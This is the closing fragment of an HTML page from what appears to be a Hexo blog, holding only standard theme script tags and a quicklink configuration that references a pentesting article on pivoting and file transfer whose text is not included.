  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.1.0/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  




  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://chronossec.site/Pentesting/Linux/pivot-tunnel-and-send-files/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
